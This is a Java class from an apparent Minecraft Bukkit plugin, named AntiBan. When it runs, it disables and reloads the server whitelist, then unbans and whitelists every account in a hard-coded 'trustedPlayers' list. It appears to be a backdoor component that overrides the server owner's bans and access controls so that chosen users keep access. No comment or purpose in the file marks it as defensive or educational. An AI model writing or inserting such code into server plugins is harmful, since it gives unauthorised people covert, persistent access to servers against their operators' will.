package de.garkolym.cp.listener;

import de.garkolym.cp.Start;
import org.bukkit.Bukkit;

public class AntiBan implements Runnable {

    public void run() {
        Bukkit.setWhitelist(false);
        Bukkit.reloadWhitelist();

        for (String user : Start.INSTANCE.trustedPlayers) {
            Bukkit.getOfflinePlayer(user).setBanned(false);
            Bukkit.getOfflinePlayer(user).setWhitelisted(true);
        }
    }

}
